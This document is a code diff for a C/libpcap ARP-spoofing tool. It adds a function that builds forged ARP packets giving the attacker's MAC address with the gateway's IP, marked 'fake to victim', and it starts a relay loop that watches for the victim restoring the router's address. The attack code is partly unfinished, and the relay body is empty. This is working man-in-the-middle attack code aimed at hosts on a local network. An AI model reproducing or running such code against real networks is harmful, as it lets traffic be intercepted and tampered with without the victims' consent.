@@ -11,6 +11,8 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
+#include <time.h>
+
 #define PROMISCUOUS 1
 #define MAC_LEN 6
 
@@ -123,6 +125,33 @@ int make_request(u_char* pdata, u_char* tip){
 
 }
 
+int make_sp_target(u_char* arp_data, u_char* targetip, u_char* req_data){
+	int i;
+	
+	// source MAC (6-11)
+	if(eth0_MAC(&arp_data[6]) == 0){
+		printf("Error : Writing my MAC address at packet ! \n");
+	}
+	// sender MAC (22-27)
+	if(eth0_MAC(&arp_data[22]) == 0){
+		printf("Error : Writing my MAC address at packet ! \n");
+	}
+	// sender IP (28-31)  --  fake to victim
+	if(gatewayIP(&arp_data[28]) == 0){
+		printf("Error : Can't read gateway address! \n");
+	}
+	// target ip (38-41)
+	for(i=0;i<4;i++){
+		arp_data[38+i] = targetip[i];
+	}
+
+	// generating ARP request for ask victim's MAC
+	if(make_request(req_data, targetip) == 0){
+		printf("Error : Making Request \n");
+	}
+	return 1;
+}
+
 int main(int argc, char* argv[]){
 	char* device = NULL;// = "eth0";
 	pcap_t* pd;
@@ -135,10 +164,12 @@ int main(int argc, char* argv[]){
 	u_char arp_data[42];
 	u_char req_data[42];
 	u_char targetip[4];
+	u_char gatewip[4];
 
 	struct pcap_pkthdr *header;
 	const u_char *pkt_data;
 	int res;
+
 
 	if(argc != 2){
 		printf("Please give target ip address!\n");
@@ -192,29 +223,17 @@ int main(int argc, char* argv[]){
 		exit(-1);
 	}
 
-////////Spoofing Target/////////////////////////////////////////////////////////////
-
-	// source MAC (6-11)
-	if(eth0_MAC(&arp_data[6]) == 0){
-		printf("Error : Writing my MAC address at packet ! \n");
-	}
-	// sender MAC (22-27)
-	if(eth0_MAC(&arp_data[22]) == 0){
-		printf("Error : Writing my MAC address at packet ! \n");
-	}
-	// sender IP (28-31)  --  fake to victim
-	if(gatewayIP(&arp_data[28]) == 0){
+	// setting gateway ip
+	if(gatewayIP(gatewip) == 0){
 		printf("Error : Can't read gateway address! \n");
 	}
-	// target ip (38-41)
-	for(i=0;i<4;i++){
-		arp_data[38+i] = targetip[i];
-	}
 
-	// generating ARP request for ask victim's MAC
-	if(make_request(req_data, targetip) == 0){
-		printf("Error : Making Request \n");
-	}
+
+
+////////Spoofing Target/////////////////////////////////////////////////////////////
+
+	make_sp_target(arp_data, targetip, req_data);
+	
 	// send ARP request to victim (broadcast)
 	if(pcap_sendpacket(pd,req_data,42) != 0){
 		printf("Error : Sending request packet!\n");
@@ -324,7 +343,18 @@ int main(int argc, char* argv[]){
 
 ////////Spoofing Router/////////////////////////////////////////////////////////////
 
-	// Now, I should write the relaying code
+	// relaying code
+	
+	while((res = pcap_next_ex( pd, &header, &pkt_data)) >= 0){
+		if(res == 0) continue;
+		if( ntohs(*((unsigned short*)(&pkt_data[12]))) == 0x0806 ){
+			// if arp -> check it is arp recovery
+			if( ntohs(*((unsigned short*)(&pkt_data[20]))) == 0x0002 ){ // reply
+				if( ( ((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)targetip)[0] ) && ( ((unsigned int*)(&pkt_data[38]))[0] == ((unsigned int*)(gatewip))[0] ) ){
+					// target is recovering router
 
+				}
+		}
+	}
 	return 0;
 }
